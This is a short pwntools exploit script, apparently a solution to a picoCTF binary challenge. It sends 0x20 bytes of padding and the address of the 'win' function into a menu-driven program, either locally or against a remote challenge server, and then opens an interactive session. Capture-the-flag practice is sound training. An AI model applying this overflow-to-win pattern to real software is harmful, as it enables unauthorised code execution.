#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mimas.picoctf.net", 55186)

    return r


def main():
    r = conn()

    r.sendlineafter(b"choice: ", b"2")
    r.sendlineafter(b"buffer: ", b"A" * 0x20 + p64(exe.sym.win))
    r.sendlineafter(b"choice: ", b"4")
    r.interactive()


if __name__ == "__main__":
    main()
